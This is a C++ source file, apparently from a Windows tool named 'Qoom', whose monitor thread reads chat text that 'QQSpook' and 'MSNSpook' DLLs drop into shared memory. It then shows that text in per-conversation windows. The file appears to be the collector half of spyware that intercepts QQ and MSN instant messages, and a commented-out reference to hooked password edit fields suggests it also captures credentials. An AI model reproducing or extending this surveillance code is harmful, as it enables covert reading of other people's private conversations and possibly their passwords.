
#include "StdAfx.h"
#include "QoomThread.h"
#include "windows.h"
#include "../Common/GlobalDef.h"
#include "../Dlls/MonitorService/MonitorService.h"
#include "../Dlls/QQSpook/QQSpook.h"
#include "../Dlls/MSNSpook/MSNSpook.h"

#define I_NEED_RTF 0

//Used by Monitor Thread
HANDLE g_hMMF;
HANDLE g_hReadEvent;
HANDLE g_hWriteEvent;
HANDLE g_hThreadEvent;

static DWORD CALLBACK readFunc(
							   DWORD cookie, 
							   LPBYTE buf,
							   LONG bytesToRead,
							   LONG *bytesRead)
{
	LPBYTE lpByte = (LPBYTE)cookie;
	
	DWORD dwSize, dwUsed;
    //head 4 byte to record size
    ::memcpy(&dwSize, lpByte, sizeof(DWORD));
	::memcpy(&dwUsed, lpByte + sizeof(DWORD), sizeof(DWORD));
	// because of the last two DWORD is resvered.

	if((int)bytesToRead >= (int)dwUsed)
	{
		//PopMsg(_T("1"));
		::memcpy(buf, lpByte + 4*sizeof(DWORD), dwUsed);
		*bytesRead = dwUsed;
		dwUsed = 0;
		::memcpy(lpByte + sizeof(DWORD), &dwUsed, sizeof(DWORD));
		return 0;
	}
	else
	{
		//PopMsg(_T("2"));
		::memcpy(buf, lpByte + 4*sizeof(DWORD), bytesToRead);
        *bytesRead = bytesToRead;
		dwUsed -= bytesToRead;
        ::memcpy(lpByte + 4, &dwUsed, 4);
        ::memmove(lpByte + 16, lpByte + 16 + bytesToRead, dwUsed); 
	}	
	return 0;
}

//CRITICAL_SECTION CriticalSection; 
static EDITSTREAM myStream = {
	0,			// dwCookie -- app specific
	0,			// dwError
	NULL		// Callback
};


DWORD WINAPI MonitorThread(LPVOID lpParam);

//Debug & Demo Only
void SetChatData(LPVOID lpData, DWORD dwLen, DWORD dwMSNFlag, DWORD dwIndex);

int FindTabIndex(BOOL bMSNActive, DWORD dwDataIndex);


BOOL InitThread(LPVOID lpParam)
{
//    // Initialize the critical section one time only.
//    InitializeCriticalSection(&CriticalSection);

	//create MMF
    g_hMMF = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, 
            PAGE_READWRITE, 0, NightmareMMFSize, g_MMF_NAME);
    if (g_hMMF == NULL)
	{
		::ReportErr(_T("Create g_hMMF Memory Mapping File Failure"));
	}
	else if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		::ReportErr(_T("g_hMMF Name Collision"));
		if(AfxMessageBox(_T("Continued Anyway?"), MB_YESNO) == IDYES)
		{
		}
		else ::PostQuitMessage(-1);
	}

	//Write to MMF header with size info
	LPVOID pView = MapViewOfFile(g_hMMF, FILE_MAP_WRITE, 0, 0, 0);
	DWORD dwSize = NightmareMMFSize;
	DWORD dwUsed = 0;
	DWORD dwIndex = 0;
	DWORD dwFlag = 1;
	LPBYTE lpByte = (LPBYTE)pView;
	::CopyMemory(lpByte, &dwSize, 4);
	::CopyMemory(lpByte + 4, &dwUsed, 4);
	::CopyMemory(lpByte + 8, &dwIndex, 4);
	::CopyMemory(lpByte + 12, &dwFlag, 4);
	::UnmapViewOfFile(pView);

	
	g_hReadEvent = ::CreateEvent(NULL, TRUE, FALSE, g_READ_EVENT_MMF_NAME);
	if(g_hReadEvent == NULL)
	{
		::ReportErr(_T("g_READ_EVENT_MMF_NAME Event Creation Failed")); 
		::PostQuitMessage(-1);
	}

	g_hWriteEvent = ::CreateEvent(NULL, TRUE, FALSE, g_WRITE_EVENT_MMF_NAME);
	if(g_hWriteEvent == NULL)
	{
		::ReportErr(_T("g_WRITE_EVENT_MMF_NAME Event Creation Failed")); 
		::PostQuitMessage(-1);
	}

	g_hThreadEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	if(g_hThreadEvent == NULL)
	{
		::ReportErr(_T("g_hThreadEvent Thread Event Creation Failed")); 
		::PostQuitMessage(-1);
	}


	::ResetEvent(g_hThreadEvent);
	::ResetEvent(g_hReadEvent);
	::ResetEvent(g_hWriteEvent);
	
	//create monitor message thread
	DWORD dwThreadId;
	HANDLE hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, &dwThreadId);
    if (hThread == NULL)
	{
		ReportErr(_T("Monitor Thread Launch Error"));
		::PostQuitMessage(-1);
	}
	::CloseHandle(hThread);

	return TRUE;
}

BOOL ExitThread()
{
	SetEvent(g_hThreadEvent);
	::Sleep(500); //Let the thread terminate

	//closed in thread
	::CloseHandle(g_hMMF);
	::CloseHandle(g_hReadEvent);
	::CloseHandle(g_hWriteEvent);
	::CloseHandle(g_hThreadEvent);

//    // Release resources used by the critical section object.
//    DeleteCriticalSection(&CriticalSection);

	return TRUE;
}

DWORD WINAPI MonitorThread(LPVOID lpParam)
{
    HANDLE hKillEvent = g_hThreadEvent;

    HANDLE hMMF, hWriteEvent, hReadEvent;

	__try
	{
		hMMF = OpenFileMapping(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, g_MMF_NAME);
        if (hMMF == NULL) 
		{
			::ReportErr(_T("Open MMF Failed in Thread")); __leave;
		}

	    hWriteEvent = ::OpenEvent(EVENT_ALL_ACCESS, FALSE,g_WRITE_EVENT_MMF_NAME);
	    if(hWriteEvent == NULL)
		{
			::ReportErr(_T("Open Write Event Failed in Thread")); __leave;
		}

	    hReadEvent = ::OpenEvent(EVENT_ALL_ACCESS, FALSE,g_READ_EVENT_MMF_NAME);
	    if(hReadEvent == NULL)
		{
			::ReportErr(_T("Open Read Event Failed in Thread")); __leave;
		}
        //the DLL can write to MMF
	    ::SetEvent(hWriteEvent);

		//DLL Launched
		if (::InitMonitor(NULL) == FALSE) {
			::ReportErr(_T("Failed to start monitor service, restart Qoom please!"));
			return (DWORD)-1;
		}
		
	    HANDLE hReadArr[2];
	    hReadArr[0] = hKillEvent;
	    hReadArr[1] = hReadEvent;
	    while(1)
		{
			DWORD dwRet = ::WaitForMultipleObjects(2, hReadArr, FALSE, 1000);//INFINITE);
            if(WAIT_OBJECT_0  == dwRet)
			{
				__leave; //Kill Event
			}
		    if(dwRet == WAIT_TIMEOUT)
			{
				//check if any target window handle obsolete
			    //CheckHookedPasswordEditArray();
			    continue;
			}
	        if(dwRet == WAIT_ABANDONED_0 || dwRet == WAIT_ABANDONED_0 + 1)
			{
				::ReportErr(_T("Mon Thread Wait Read Failed"));
		        __leave;
			}
            ASSERT((WAIT_OBJECT_0 + 1) == dwRet);
		    //Stop DLL from Writing
		    ::ResetEvent(hReadEvent);
		 		
	        LPVOID pView = MapViewOfFile(hMMF, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	        if(pView == NULL) __leave; 
		    LPBYTE lpByte = (LPBYTE)pView;
			// Memory alloc
			//|--dwSize--|--dwUsed--|--+Index--|--+flag--|--valid data--|
		    DWORD dwSize, dwUsed, dwIndex, dwFlag;
            ::CopyMemory(&dwSize, lpByte, sizeof(DWORD));
			::CopyMemory(&dwUsed, lpByte+sizeof(DWORD), sizeof(DWORD));
			::CopyMemory(&dwIndex, lpByte+2*sizeof(DWORD), sizeof(DWORD));
			::CopyMemory(&dwFlag, lpByte+3*sizeof(DWORD), sizeof(DWORD));

			// Move to valid data address.
		    SetChatData(pView, dwUsed, dwFlag, dwIndex);

			//Clear MMF
			dwUsed = 0;
		    ::CopyMemory(lpByte+sizeof(DWORD), &dwUsed, sizeof(DWORD));

		    ::UnmapViewOfFile(pView);
		    ::SetEvent(hWriteEvent);
		}
	}
	__finally
	{
		::CloseHandle(hMMF);
		::CloseHandle(hWriteEvent);
		::CloseHandle(hReadEvent);

		::ExitMonitor();
		return 0;
	}
	return 0;
}

void SetChatData(LPVOID lpData, DWORD dwLen, DWORD dwMSNFlag, DWORD dwIndex)
{
	if (dwMSNFlag != 0 && dwMSNFlag != 1) {
		return;
	}
	if (dwMSNFlag == 1) {
		if (dwIndex < 0 || dwIndex > MAX_MSN_CONCUR_CHAT) {
			return;
		}
	} else {
		DWORD dwRow = LOWORD(dwIndex);
		DWORD dwCol = HIWORD(dwIndex);
		if (dwRow < 0 || dwRow > MAX_QQ_CONCUR_MAIN ||
			dwCol < 0 || dwCol > MAX_QQ_CONCUR_CHAT) {
			return;
		}
	}
	myStream.dwCookie = (DWORD_PTR)lpData;
	myStream.dwError = 0;
	myStream.pfnCallback = readFunc;

	HWND hRich = NULL;
	DWORD dwActive = dwIndex;
	BOOL bMSNActive = (dwMSNFlag == 1)? TRUE : FALSE;
	DWORD dwTabIndex = (DWORD)-1;
//	BOOL bChanged = FALSE;
	if (bMSNActive) {
		dwTabIndex = FindTabIndex(TRUE, dwActive);
		if (dwTabIndex != (DWORD)-1) {
			hRich = g_hChatHisEditMSN[dwActive];
			g_bHisChangedMSN[dwActive] = TRUE;
			// Post message for info the text now changed.
			::PostMessage(g_hMainDlg, WM_QQ_TEXT_CHANGE, WPARAM(dwTabIndex), LPARAM(0));
		}
	} else {
		dwTabIndex = FindTabIndex(FALSE, dwActive);
		if (dwTabIndex != (DWORD)-1) {
			hRich = g_hChatHisEditQQ[dwTabIndex];
			g_bHisChangedQQ[dwTabIndex] = TRUE;
			// Post message for info the text now changed.
			::PostMessage(g_hMainDlg, WM_QQ_TEXT_CHANGE, WPARAM(dwTabIndex), LPARAM(1));
		}
	}
#ifdef I_NEED_RTF
	::SendMessage( 
		(HWND) hRich,						// handle to destination window 
		EM_STREAMIN,						// message to send
		(WPARAM) SF_RTF,					// format options
		(LPARAM)(EDITSTREAM*)&myStream		// data (EDITSTREAM *)
		);
#else
#ifdef _UNICODE
	::SendMessage( 
		(HWND) hRich,						// handle to destination window 
		EM_STREAMIN,						// message to send
		(WPARAM) SF_TEXT | SF_UNICODE,      // format options
		(LPARAM)(EDITSTREAM*)&myStream		// data (EDITSTREAM *)
		);
#else
	::SendMessage( 
		(HWND) hRich,						// handle to destination window 
		EM_STREAMIN,						// message to send
		(WPARAM) SF_TEXT,					// format options
		(LPARAM)(EDITSTREAM*)&myStream		// data (EDITSTREAM *)
		);
#endif
#endif
	// Scroll the richedit to bottom.
	::SendMessage(hRich, EM_SCROLL, (WPARAM)SB_BOTTOM, (LPARAM)0);
}

int FindTabIndex(BOOL bMSNActive, DWORD dwDataIndex)
{
	if (bMSNActive == TRUE) {
		return (int)g_hTabIndexMSN[dwDataIndex];
	} else {
		for(DWORD i = 0; i < MAX_QQ_CONCUR_CHAT; i++) {
			if (g_hTabIndexQQ[i] == dwDataIndex) {
				return i;
			}
		}
	}
	return -1;
}
